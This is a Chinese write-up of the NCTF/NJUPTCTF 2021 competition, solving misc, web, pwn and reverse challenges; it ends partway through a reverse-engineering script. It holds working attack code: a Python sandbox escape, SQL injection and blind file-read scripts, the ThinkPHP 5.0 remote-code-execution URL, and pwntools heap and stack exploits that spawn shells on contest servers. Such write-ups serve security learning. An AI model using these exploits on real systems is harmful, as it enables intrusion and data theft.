# NCTF/NJUPTCTF 2021 部分 WriteUp

阅读量 **299135**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-31 10:00:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01eaca85ee35189dde.jpg)

## 引言

> 参赛对象 ：分为校内队伍和校外队伍，其中校内队伍指由南京邮电大学在读学生所组成的队伍。
>
> 参赛要求 ：本次比赛以队伍形式报名参赛，每队至多四人。
>
> 报名开始日期 ：11月22日
>
> 报名截止日期 ：11月26日
>
> 比赛时间 ：11月27日9：00——11月28日21：00
>
> 举行方式 ：线上比赛
>
> <https://nctf.h4ck.fun>

一年一度的 NCTF 又来了。是南邮的校赛啦。

![](https://p3.ssl.qhimg.com/t01931f2822d534e0ac.png)

> 可以回顾一下去年的 Writeup：
>
> [CTF | 2020 NCTF/NJUPTCTF
> 部分WriteUp](https://miaotony.xyz/2020/11/23/CTF_2020NJUPTCTF/)

看到校外队伍今年前六有钱（京东卡）拿，前十就有礼品了，想起来去年还水了个第六，应该还是挺有希望的。

于是就拉上几个小伙伴，组了个 **猫鼠大战** 战队，报名来玩了。

说实话也就是随意看看题，喵喵主要看的 Misc 和 Web 题目，Pwn 和 Reverse 是队友做的。

题目好难，嘤嘤嘤。

## Misc

###  签到

复制粘贴

`NCTF{Welcome_to_NCTF_2021!}`

###  Hex酱的秘密花园

> 题目描述:
>  
>  
>     我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~
>     但是为了防止有些居心叵测的人，我们专门把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~
>
>     Ubuntu Python3.6.9
>
>     快去找Hex酱(QQ:2821876761)私聊吧
>  
>
> 附件：
>  
>  
>     https://nctf.slight-wind.com/misc/hex/runner.py
>     https://attachment.h4ck.fun:9000/misc/hex/runner.py
>  

`runner.py`

    
    
    import sys
    from base64 import b64decode
    
    code = sys.argv[1]
    
    try:
        data = b64decode(code.encode()).decode()
    except:
        exit(0)
    
    for c in 'h"\'(':
        if c in data: exit(0)
    
    exec(data)
    

u1s1，过滤了其他的都好说，多多少少在 Flask SSTI 或者其他用到 python 命令执行绕过的场合都见的很多了。然而把小括号 `(`
过滤了，那就真没见过了。

比赛的时候网上找了一堆，都说过滤了小括号就执行不了函数了，所以基本无解。

![](https://p5.ssl.qhimg.com/t0111af6fc7de6c956c.png)

于是想了一天都没想到要怎么绕过这个，唉，还是太菜了……（或者说需要对 python 了解比较多，且要有点脑洞才行了

难道真的没法绕过嘛？不是的。

这里要用到的是 python 里的函数装饰器，也就是 `@` 用法，`@` 符号就是装饰器的语法糖。

[廖雪峰的 python
教程——装饰器](https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584)

![](https://p1.ssl.qhimg.com/t012b4777d005ffabae.png)

    
    
    def log(func):
        print("%s is running" % func.__name__)
        func()
    
    @log
    def foo():
        print("i am foo")
    

执行 `foo` 就相当于执行下面这个之后的 `foo` 函数了。

    
    
    foo = log(foo)
    

而且装饰器是可以嵌套的。

![](https://p2.ssl.qhimg.com/t01444e419c8a8ebd34.png)

由于没有 ban `os` 这些关键字，可以直接 import 进来拿来用。

而字符的话，由于不能用引号，所以可以用 `__doc__` 从一些对象的 docstrings 文档里通过下标来取。这个要注意相应的 python
版本，这题环境是 Ubuntu Python3.6.9。

（这里推荐用 [pyenv](https://github.com/pyenv/pyenv) 来玩

另外，可以执行多行命令。由于不能用 `(`，不能构造函数了，但还可以构造对象。

其实这里只需要执行系统命令就行，也就是 `system(xxx)`.

一步步来，先用文档构造字符串

    
    
    n = {}.__doc__
    s = 'ls'
    s = 'cat flag'
    for i in s:
        try:
            idx = n.index(i)
        except:
            idx = 'error'
        print(i, '===>', idx)
    # l ===> 69
    # s ===> 97
    # 
    # c ===> 2
    # a ===> 27
    # t ===> 3
    #   ===> 6
    # f ===> 75
    # l ===> 69
    # a ===> 27
    # g ===> 42
    

试了试发现 class 里其实啥都行，比如 `object`, `list`, `int` 都行， ~~反正也就是应付个匿名函数的变量罢了~~ （？）。甚至
`pass` 也行，这么说其实也就是为了满足 class 创建的语法要求吧。

于是喵喵构造的 payload 就是

    
    
    from os import system
    n = {}.__doc__
    l = lambda _: n[69]+n[97]  # ls
    f = lambda _: n[2]+n[80]+n[55]+n[6]+n[75]+n[69]+n[80]+n[88]  # cat flag
    @system
    @f
    class x:pass
    

实际上执行的就是

    
    
    system((lambda _:'cat flag')(x))
    

![](https://p4.ssl.qhimg.com/t013a7ce7f184387ab5.png)

![](https://p5.ssl.qhimg.com/t01b3c3ef1bbbb7c2f5.png)

成功啦！

再看官方 wp，这个就更一般化了。

    
    
    b=[].__class__.__base__.__class__.__subclasses__
    d=[].__doc__
    n={}.__doc__
    _=lambda _:[].__class__.__base__
    @b
    @_
    class s:_
    l=s[69]
    q=lambda _:d[66]+d[2]
    p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88]
    @l.load_module
    @q
    class o:_
    @o.system
    @p
    class w:_
    

详见喵喵的注释。

    
    
    b=[].__class__.__base__.__class__.__subclasses__  # <method '__subclasses__' of 'type' objects> 也就是 type.__subclasses__
    d=[].__doc__  # "list() -> new empty list\nlist(iterable) -> new list initialized from iterable's items"
    n={}.__doc__  # "dict() -> new empty dictionary\ndict(mapping) -> new dictionary initialized from a mapping object's\n    (key, value) pairs\ndict(iterable) -> new dictionary initialized as if via:\n    d = {}\n    for k, v in iterable:\n        d[k] = v\ndict(**kwargs) -> new dictionary initialized with the name=value pairs\n    in the keyword argument list.  For example:  dict(one=1, two=2)"
    _=lambda _:[].__class__.__base__  # <class 'object'>
    @b
    @_
    class s:_  # s => type.__subclasses__(object) 是个包含各种class的list
    l=s[69]  # <class '_frozen_importlib.BuiltinImporter'>
    q=lambda _:d[66]+d[2]  # os
    p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88]  # cat flag
    @l.load_module
    @q
    class o:_  # o => <module 'os' (built-in)>
    @o.system
    @p
    class w:_
    

一步步加载模块 load_module `os`，最后利用其中的 `system` 执行 `cat flag`。

![](https://p2.ssl.qhimg.com/t010deb25c70182d3b6.png)

另外找资料的时候还有一些神奇的发现，列在下面了。

> **Extensive Readings:**
>
>   * [Python模板注入(SSTI)深入学习](https://xz.aliyun.com/t/6885)
>   * [总结 – CTF中的SSTI0x01](https://morblog.cc/posts/21233/) 里面总结了好多种过滤字符的绕过方法
>   * [浅析SSTI(python沙盒绕过)](http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-> python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/)
>   * 郁离歌丶的 [python安全之学习笔记（一）](http://yulige.top/?p=502)
> python沙盒逃逸，任意命令执行的一些函数和模块，balabala
>   * [[译]PlaidCTF中一道PyJail逃逸题目分析 ](https://www.gem-love.com/ctf/2345.html)
> python2 中 `x` 和 `repr(x)` 完全等价，这题仅仅通过 `set([':', '%', "'", '', '(', ',',
> ')', '}', '{', '[', '.', ']', '<', '_', '~'])` 中的字符来获得代码。利用符号通过 True False
> 来创造数字，再通过切片得到字符。感觉有点类似与 Brainfuck 了。
>   * [一道有趣的pyjail题目分析](https://xz.aliyun.com/t/9271) 用 Unicode 绕过，在 python3
> 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的NFKC
> 也就是标准模式。[unicode字符大全](http://www.52unicode.com/mathematical-alphanumeric-> symbols-zifu)
>   *
> [Python黑魔法-[]绕过空格实现变量覆盖](https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/)
> 过滤等号时用 for 循环覆盖变量，过滤空格时用 list 生成器和中括号。可以先把过滤的变量给覆盖掉，再 RCE 或者读文件什么的。
>  
>     >     >>> a = 0
>     >>> for a in [1]:
>     ...     pass
>     ...
>     >>> a
>     1
>     >>> a = 0
>     >>> [[str][0]for[a]in[[1]]]
>     [<type 'str'>]
>     >>> a
>     1
>  
>
>

###  Hello File Format

> 题目描述:
>  
>  
>     aiQG_ is learning to develop programs for macOS GPU.
>     He got a file from the GPU, but he couldn't read it.
>     Can you translate this file for him?
>  
>
> 附件链接:
>  
>  
>     链接：https://pan.baidu.com/s/1swBiyWrAx33M8DDJh7LtNQ
>     提取码：uo1v
>     https://wwn.lanzoui.com/ix6wXwyi0ih
>  
>
> hint:
>  
>  
>     aiQG_ wanted to render one frame of 1920*1080
>  

一个 bin 文件，里面巨多的 0xff

![](https://p5.ssl.qhimg.com/t01e3445025dd19c841.png)

总长度 0x5EEC00，提示说他在渲染一张 1920*1080 的图，除一下发现正好是3倍长度，很明显是 RGB 了。

Exp:

    
    
    # >>> 1920*1080
    # 2073600
    # >>> hex(1920*1080)
    # '0x1fa400'
    # >>> 0x5EEC00/0x1fa400
    # 3.0
    
    from PIL import Image
    with open('GPU data.bin', 'rb') as f:
        s = f.read()
    
    l = [(s[i], s[i+1], s[i+2]) for i in range(0, len(s), 3)]
    
    img = Image.new('RGB', (1920, 1080))
    img.putdata(l)
    # img.show()
    img.save('GPU data.png')
    # NCTF{TGA_NOT_GTA}
    

![](https://p1.ssl.qhimg.com/t015a114eb18a1ed0b3.png)

看了官方 wp 说这个是 [tga 格式](https://en.wikipedia.org/wiki/Truevision_TGA)

> TGA files commonly have the extension “.tga” on PC DOS/Windows systems and
> macOS (older Macintosh systems use the “TPIC” type code). The format can
> store image data with 8, 15, 16, 24, or 32 bits of precision per pixel[3] –
> the maximum 24 bits of RGB and an extra 8-bit alpha channel. Color data can
> be color-mapped, or in direct color or truecolor format. Image data may be
> stored raw, or optionally, a lossless RLE compression similar to PackBits
> can be employed. This type of compression performs poorly for typical
> photographic images, but works acceptably well for simpler images, such as
> icons, cartoons and line drawings.

###  做题做累了来玩玩游戏吧

> 题目描述：
>  
>  
>     做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～
>     对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持
>  
>
> 附件链接：
>  
>  
>     https://attachment.h4ck.fun:9000/misc/PlaneFire.app.tar.gz
>     https://upyun.clq0.top/PlaneFire.app.tar.gz
>     https://nctf.slight-wind.com/misc/PlaneFire.app.tar.gz
>  

好像是个 unity 的游戏，题目说要用 mac，Intel 和 Apple silicon 芯片都支持才能玩游戏，可恶啊！

不如直接去资源文件里翻垃圾

![](https://p1.ssl.qhimg.com/t01664f4a390858b4c8.png)

![](https://p2.ssl.qhimg.com/t011b01510c95224869.png)

![](https://p0.ssl.qhimg.com/t01df2ebc726ac9ab53.png)

很好。

## Web

###  ezsql

> 题目描述: 这还能注入吗 <http://129.211.173.64:3080/login.php>
>
> 附件链接： <http://129.211.173.64:3080/www.zip>

`login.php`

    
    
    //...
    <?php
    if (isset($_POST['password'])){
        $query = db::prepare("SELECT * FROM `users` where password=md5(%s)", $_POST['password']);
    
        if (isset($_POST['name'])){
            $query = db::prepare($query . " and name=%s", $_POST['name']);
        }
        else{
            $query = $query . " and name='benjaminEngel'";
        }
        $query = $query . " limit 1";
    
        $result = db::commit($query);
    
        if ($result->num_rows > 0){
            die('NCTF{ez');
        }
        else{
            die('Wrong name or password.');
        }
    }
    //...
    

`DB.php`

    
    
    <?php
    
    class DB{
        private static $db = null;
    
        public function __construct($db_host, $db_user, $db_pass, $db_database){
            static::$db = new mysqli($db_host, $db_user, $db_pass, $db_database);
        }
    
    
        static public function buildMySQL($db_host, $db_user, $db_pass, $db_database)
        {
            return new DB($db_host, $db_user, $db_pass, $db_database);
        }
    
        public static function getInstance(){
            return static::$db;
        }
    
        public static function connect_error(){
            return static::$db->connect_errno;
        }
    
        public static function prepare($query, $args){
            if (is_null($query)){
                return;
            }
            if (strpos($query, '%') === false){
                die('%s not included in query!');
                return;
            }
    
            // get args
            $args = func_get_args();
            array_shift( $args );
    
            $args_is_array = false;
            if (is_array($args[0]) && count($args) == 1 ) {
                $args = $args[0];
                $args_is_array = true;
            }
    
            $count_format = substr_count($query, '%s');
    
            if($count_format !== count($args)){
                die('Wrong number of arguments!');
                return;
            }
            // escape
            foreach ($args as &$value){
                $value = static::$db->real_escape_string($value);
            }
    
            // prepare
            $query = str_replace("%s", "'%s'", $query);
            $query = vsprintf($query, $args);
            return $query;
    
        }
        public static function commit($query){
            $res = static::$db->query($query);
            if($res !== false){ 
                    return $res;
                }
                else{
                    die('Error in query.');
            }
        }
    }
    ?>
    

`config.php`

    
    
    <?php
    $db_host = "db";
    $db_user = "mysql";
    $db_pass = "mysql123";
    $db_database = "2021";
    
    include 'DB.php';
    DB::buildMySQL($db_host, $db_user, $db_pass, $db_database);
    
    if(db::connect_error()){
        die('Error whiling connecting to DB');
    }
    ?>
    

参考 [Hack.lu CTF 2021 Diamond Safe
一题的一部分](https://www.creastery.com/blog/hack.lu-ctf-2021-web-challenges/)，几乎是原题吧。

由于用了两次 `db::prepare`，而第二次直接拼接了之前的 `$query`，于是可以在第一次的时候 `password` 参数传
`%s`，而后在第二次通过数组传 `name`，从而依次给两个 `%s` 赋值，这样就能实现 sql 注入了。

payload:

![](https://p0.ssl.qhimg.com/t01ce5c021c488cf98b.png)

    
    
    POST /login.php HTTP/1.1
    Host: 129.211.173.64:3080
    Content-Length: 62
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade-Insecure-Requests: 1
    Origin: http://129.211.173.64:3080
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://129.211.173.64:3080/login.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    
    password=%s&name[0]=)+or+1%3d1+union+select+1,2,3--+&name[1]=a
    

得到第一部分flag：`NCTF{3v3ryth1ng_`

提示说另一部分在数据库里。

然后拿 sqlmap 盲注一下 `name[0]` 参数就行。这里是时间盲注，布尔盲注应该也行。要是二分法更快了。

    
    
    Payload: password=%s&name[0]=) AND (SELECT 8543 FROM (SELECT(SLEEP(5)))zAnj)-- kVPP&name[1]=a
    

发现 flag 在 `2021` 数据库下的 `NcTF` 表里，列名为 `fl[@g](https://github.com/g "@g")`。

这个 `fl[@g](https://github.com/g "@g")` 要拿反引号包一下，不然就全是 NULL 了。

    
    
    sqlmap -r payload.txt --random-agent -p "name[0]" -D 2021 -T NcTF -C '`fl@g`' --dump -v
    

![](https://p5.ssl.qhimg.com/t01917ed0593fe3c696.png)

得到 `not_fantast1c_:)}`

`NCTF{3v3ryth1ng_not_fantast1c_:)}`

###  摆就完事了

> 题目描述： 啊对对对 太对辣太对辣
>
> target 1: <http://129.211.173.64:8085/public/index.php/index/index/index>  
>  target 2: <http://47.101.160.205:8085/public/index.php/index/index/index>
>
> 备注： if you get no idea about the problem,there is no harm in diffing the
> source code with the official one.

ThinkPHP v5.0.16

`www.zip` 有源码

不过发现直接拿那个经典 RCE 的来打就行。

    
    
    http://129.211.173.64:8085/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
    
    http://129.211.173.64:8085/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat${IFS}/flag
    

或者找个现成工具（

![](https://p4.ssl.qhimg.com/t01185dc40db22e6c6a.png)

`nctf{m1saka_wanna_kaibai}`

###  摆就完事了2.0

> 题目描述：  
>  卷起来 不准摆！  
>  target: <http://129.211.173.64:8086/public/index.php/index/index/index>

这题也给了 www.zip 源码。

和上面一题源码 diff 一下。

![](https://p1.ssl.qhimg.com/t019fda297e08558335.png)

![](https://p3.ssl.qhimg.com/t0155f1a1ec1c9bce0e.png)

![](https://p5.ssl.qhimg.com/t0164bf6b0db158b168.png)

可以发现把那个 RCE 的给修了，而且给了个 `ffllaagg.php`，应该就是要读这个文件了。

那还是接着看他控制器吧。

`application/index/controller/M1sakaM1yuu.php`

    
    
    <?php 
    /*
     * @Author: m1saka@x1ct34m
     * @blog: www.m1saka.love
     */
    
    namespace app\index\controller;
    function waf($str){
        if(preg_match("/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i", $str)){
            return true;
        }
    }
    class M1sakaM1yuu
    {
        public function index()
        {
            $username = request()->get('username/a');
            $str = implode(',',$username);
            if (waf($str)) {
                return '<img src="http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg" alt="hutao" />';
            }
            if($username){
                db('m1saka')->insert(['username' => $username]);
                return '啊对对对';
            }
            else {
                return '说什么我就开摆';//
            }
        }
    }
    

按理说，访问 <http://129.211.173.64:8086/public/index.php/index/M1sakaM1yuu/index>
应该就能到这里，但是这里不行。

为了访问到这里，特地去看了 [ThinkPHP 的控制器路由](https://www.kancloud.cn/thinkphp/controller-in-detail/250868)，这个是驼峰命名法。

![](https://p1.ssl.qhimg.com/t017db3fef0608a698b.png)

![](https://p5.ssl.qhimg.com/t01a219ba85fe888b68.png)

这道题里 `url_convert` 就设置为 `true`，所以就只能通过 下划线 的方式来访问了。

![](https://p5.ssl.qhimg.com/t01f1bbe07a4e09ff30.png)

正如出题人的回复：

>
> 出题的时候特意定义了一个使用驼峰命名法的控制器M1sakaM1yuu，在thinkPHP官方文档中，访问的正确方式应该是index/m1saka_m1yuu/index，中间使用下划线隔开，但是兼容了index/M1sakaM1yuu/index这样的访问方式，这也是在《摆就完事了》中此访问方式能访问到的原因。但是在《摆就完事了2.0》中我加上了官方补丁取消非预期解法，官方补丁不允许路由中存在大写字母，所以会返回404。希望大家以后在开发和代码审计时能注意到这个细节。

于是应该访问 <http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index>

接下来就是 SQL 注入了。

> 还好出题人给了 sql 文件，可以方便复现。
>  
>  
>     DROP DATABASE IF EXISTS `nctf`;
>     CREATE DATABASE nctf;
>     GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@'127.0.0.1'
> identified by 'nctf';
>     GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@localhost identified
> by 'nctf';
>     GRANT ALL PRIVILEGES on *.* to nctf@'127.0.0.1' WITH GRANT OPTION;
>     GRANT ALL PRIVILEGES on *.* to nctf@localhost WITH GRANT OPTION;
>     flush privileges;
>     use nctf;
>
>     CREATE TABLE `m1saka`  (
>       `id` integer(9) AUTO_INCREMENT,
>       `username` varchar(20) NOT NULL,
>       `password` varchar(50) NULL,
>       `flag_in_ffllaagg.php` varchar(100) NULL,
>       `age` int(5) NULL,
>       PRIMARY KEY (`id`)
>     );
>
>     INSERT INTO `m1saka`
> (`username`,`password`,`flag_in_ffllaagg.php`,`age`) VALUES
> ('m1saka','marry_dingnan','Admin',999);
>  
>
> 这里也提示了 flag 在那个文件里。

这里复现一下，由于目前主办方还没有开源题目，这里就用 DASCTF 的模板自己造一个 Dockerfile 好了。

    
    
    FROM dasctfbase/web_php56_apache_mysql
    COPY www /var/www/html
    
    # 如需操作数据库请将 sql 文件拷贝到 /db.sql
    COPY www/db.sql /db.sql
    
    # 请声明对外暴露端口
    EXPOSE 80
    
    
    
    docker build -t nctf2021_bai .
    docker run -it -d -p 8000:80 nctf2021_bai:latest
    docker ps
    # xxxxx
    # 进去改 MySQL 配置
    docker exec -it xxxx /bin/bash
    

首先需要把 MySQL 的 `secure_file_prive` 全局参数设为空（不是 `NULL`）。

设置之前，是读不到其他文件的。

![](https://p3.ssl.qhimg.com/t014cadd306c8132147.png)

>   1. 限制 mysql 不允许导入 | 导出`--secure_file_prive=null`
>   2. 限制 mysql 的导入 | 导出 只能发生在 `/tmp/` 目录下`--secure_file_priv=/tmp/`
>   3. 不对 mysql 的导入 | 导出做限制`--secure_file_priv=`
>

    
    
    echo 'secure_file_priv=' >> /etc/mysql/mysql.conf.d/mysqld.cnf
    

![](https://p5.ssl.qhimg.com/t01b64d6e5c0aff7313.png)

然后重启容器，这样就能读到文件了。

![](https://p2.ssl.qhimg.com/t010d354100bb7d3669.png)

现在就可以访问
<http://127.0.0.1:8000/public/index.php/index/m1saka_m1yuu/index?username=>
进入到所需的控制器了。

接下来就是 SQL 注入环节。

对比一下官方源码，有个 `EXP` 的过滤给去掉了。

![](https://p2.ssl.qhimg.com/t01bc5a5699a0560684.png)

跟着 `db('m1saka')->insert(['username' => $username]);` 看 `insert`

![](https://p1.ssl.qhimg.com/t01c7605442bbe26f00.png)

![](https://p3.ssl.qhimg.com/t0143d390fb78716747.png)

![](https://p5.ssl.qhimg.com/t01e8684d7e56148458.png)

所以只需要传个数组（array），然后第0个元素是 `exp`，第1个元素放注入的内容就完事了。

再来看 waf。

    
    
    function waf($str){
        if(preg_match("/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i", $str)){
            return true;
        }
    }
    

相当于把写文件的那些都过滤掉了。再考虑到提示了是读文件，于是试着构造时间盲注。

    
    
    GET /public/index.php/index/m1saka_m1yuu/index?username[0]=exp&username[1]=if((select(substr(load_file("/var/www/html/ffllaagg.php"),1,1))=0x3c),sleep(3),0)
    

先在 docker 里的 mysql 试试。

![](https://p4.ssl.qhimg.com/t017e1b327b04516905.png)

Exp:

这里本地调试，延时就设的短一点了，实际根据需要调整一下就行。（

    
    
    # MiaoTony
    import requests
    import time
    import string
    
    url = r'http://xxxxxx:xxxx/public/index.php/index/m1saka_m1yuu/index'
    
    s = r'{}<>?. ' + string.ascii_letters + string.digits + r'!@#$%^&*()_-+="\'\\/'
    flag = ''
    
    for i in range(1, 100):
        for j in s:
            payload = f'select(substr(load_file("/var/www/html/ffllaagg.php"),{i},1))={hex(ord(j))}'
            # print(payload)
            param = {'username[0]': 'exp',
                     'username[1]': f'if(({payload}),sleep(1.5),0)'}
            t = time.time()
            r = requests.get(url, params=param)
            if time.time() - t > 1:
                flag += j
                print(f'[+] {i} {j} {flag}')
                break
    
    # username[0]=exp&username[1]=if((select(substr(load_file("/var/www/html/ffllaagg.php"),1,1))=0x3c),sleep(3),0)
    # username[0]=exp&username[1]=sleep(if((select(substr(load_file("/var/www/html/ffllaagg.php"),1,1))=0x3c),3,0))
    

![](https://p4.ssl.qhimg.com/t01fdc02a2c850bdd88.png)

完事。

另外本地还可以把 `config.php` 里的 debug 和 trace 改成 true，来调试看看调用栈。

![](https://p4.ssl.qhimg.com/t01c8954d9333e7661c.png)

比如故意在 SQL 里加个 `'`，然后看看。

![](https://p0.ssl.qhimg.com/t01c9ef9f037a65edda.png)

![](https://p2.ssl.qhimg.com/t0150f30ad908ce010e.png)

## Pwn

###  ezheap

> 题目描述:
>  
>  
>     总之就是非常简单
>     nc 129.211.173.64 10002
>  
>
> 附件链接:
>  
>  
>     http://download.kagehutatsu.com/Download/ezheap.zip
>     https://attachment.h4ck.fun:9000/pwn/ezheap/ezheap.zip
>     https://nctf.slight-wind.com/pwn/ezheap/ezheap.zip
>  

简单uaf，直接打free_hook

    
    
    from pwn import *
    context.log_level = 'debug'
    # sh = process('./ezheap')
    sh = remote('129.211.173.64',10002)
    
    def menu(choice):
        sh.recvuntil(">> ")
        sh.sendline(str(choice))
    
    def add(size, content):
        menu(1)
        sh.recvuntil(': ')
        sh.sendline(str(size))
        sh.recvuntil(': ')
        sh.send(content)
    
    
    def edit(idx, content):
        menu(2)
        sh.recvuntil(': ')
        sh.sendline(str(idx))
        sh.recvuntil(': ')
        sh.send(content)
    
    
    def delte(idx):
        menu(3)
        sh.recvuntil(': ')
        sh.sendline(str(idx))
    
    def show(idx):
        menu(4)
        sh.recvuntil(': ')
        sh.sendline(str(idx))
    
    for i in range(30):
        add(0x70, b'a'*0x70)
    
    delte(0)
    
    show(0)
    heap_base = u64(sh.recv(8)) << 12
    
    log.success('heapbase: ' + hex(heap_base))
    
    for i in range(1,7):
        delte(i)
    
    delte(7)
    delte(8)
    delte(7)
    
    for i in range(7):
        add(0x70,'d'*0x70)
    
    add(0x70, 'c'*0x70)
    
    edit(15, p64((heap_base + 0x290) ^ (heap_base >> 12))+b'\n')
    
    add(0x70, b'a'*0x70)
    add(0x70, b'a'*0x70)
    add(0x70, p64(0) + p64(0x481) + b'\n')
    
    delte(0)
    
    show(0)
    
    libc_base = u64(sh.recv(8)) - 0x1e0c00
    
    log.success('libc_base: ' + hex(libc_base))
    
    system = libc_base + 0x00000000004fa60
    binsh_str = libc_base + 0x00000000001abf05
    free_hook = libc_base + 0x0000000001e3e20
    
    add(0x70, 'c'*0x70)
    
    delte(0)
    edit(15, p64((0) ^ (heap_base >> 12)) + p64(0)+b'\n')
    delte(0)
    edit(15, p64((0) ^ (heap_base >> 12)) + p64(0)+b'\n')
    delte(0)
    edit(15, p64((free_hook) ^ (heap_base >> 12))+b'\n')
    
    add(0x70, b'a'*0x70)
    add(0x70, p64(system) + b'\n')
    
    add(0x20, '/bin/sh\x00')
    
    delte(15)
    
    
    sh.interactive()
    

###  login

> 题目描述:
>  
>  
>     Welcome, it's ez
>     nc 129.211.173.64 10005
>  
>
> 附件链接:
>  
>  
>     http://download.kagehutatsu.com/Download/login.zip
>     https://attachment.h4ck.fun:9000/pwn/login/login.zip
>     https://nctf.slight-wind.com/pwn/login/login.zip
>  

栈溢出，使用栈迁移，然后调用syscall

    
    
    from pwn import *
    # sh = process('./login')
    sh = remote('129.211.173.64',10005)
    syscall = 0x0000000000110628
    close_plt = 0x401090
    bin_sh_addr = 0x404800
    retn_addr = 0x401220
    pop_rsi_r15_ret = 0x0000000000401291
    pop_rdi_ret = 0x0000000000401293
    addr = 0x40128A
    read_plt = 0x4010A0
    # gdb.attach(sh)
    
    sh.recvuntil('Welcome to NCTF2021!\n')
    
    
    bss = 0x404500
    main = 0x4011ED
    
    payload = b'a'*0x100
    payload += p64(bss)
    payload += p64(main)
    
    sh.send(payload)
    
    # sh.recvuntil('Welcome to NCTF2021!\n')
    
    
    sleep(0.2)
    payload = p64(0) + p64(1) + p64(0) + p64(0x0000000000404028)
    payload += p64(0x2) + p64(0x404400 + 0x38) + p64(0x401270) + p64(read_plt) 
    payload += p64(0) + p64(1) + p64(0) + p64(0x404900) + p64(0x3b) + p64(0x404400 + 0x78) + p64(0x401270) + p64(read_plt)
    payload += p64(0) + p64(0x4044f8) + p64(0x4044f8) + p64(0) + p64(0) + p64(0x404400 + 0xb8) + p64(0x401270) + p64(close_plt)
    payload = payload.ljust(0xf8, b'a') + b'/bin/sh\x00'
    
    sh.send(payload + p64(bss - 0x110) + p64(0x4011ED))
    
    sleep(0.2)
    payload = b'a' * 0x108 + p64(0x40128A)
    sh.send(payload)
    
    sleep(0.5)
    sh.send(b'\x28\x56')
    
    sleep(0.5)
    sh.send(b'a' * 0x3b)
    
    sh.interactive()
    
    '''
    0xe6c7e execve("/bin/sh", r15, r12)
    constraints:
      [r15] == NULL || r15 == NULL
      [r12] == NULL || r12 == NULL
    
    0xe6c81 execve("/bin/sh", r15, rdx)
    constraints:
      [r15] == NULL || r15 == NULL
      [rdx] == NULL || rdx == NULL
    
    0xe6c84 execve("/bin/sh", rsi, rdx)
    constraints:
      [rsi] == NULL || rsi == NULL
      [rdx] == NULL || rdx == NULL
    
    
    0x270b3
    '''
    

## Reverse

###  Hello せかい

> 题目描述:
>  
>  
>     欢迎来到NCTF-逆向工程(Reverse Engineering)
>
>     这里可能有你需要的工具:
>     ida pro 7.6 :链接：https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg 提取码：o49x
>  
>
> 附件链接:
>  
>  
>     链接：https://pan.baidu.com/s/1qPHbnzNrg-8ocG2CkYh_4w
>     提取码：mbxp
>
> https://attachment.h4ck.fun:9000/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-> RE.zip
>     https://nctf.slight-> wind.com/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-RE.zip
>  

flag 如图所示

![](https://p4.ssl.qhimg.com/t01f62a3ce42463865f.png)

###  Shadowbringer

> 题目描述:
>  
>  
>     One brings shadow, one brings light.
>     Two-toned echoes, tumbling through time.
>     Threescore wasted, ten cast aside.
>     Four-fold knowing, no end in sight.
>     ---EZCPP FOR YOU, JUST HAVE FUN!--->  
>
> 附件链接:
>  
>  
>     链接：http://39.102.33.27:5212/#/s/rwSw
>     https://upyun.clq0.top/Shadowbringer.exe
>  

本质上为自制双重base64，连续修改了俩表，反过来运算即可

    
    
    table = "#$%&'()*+,-.s0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab"
    # ans_index = [8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31,43, 36, 3, 21, 65, 65]
    # table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    def find_real_string():
        return ''.join(table[i-1] for i in ans_index)
    
    #!/usr/bin/env python3
    
    def myBase64Encode(preCoding):
        charTable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #字符表
    
        if len(preCoding) < 0:
            return ''  #字符串为空则返回空
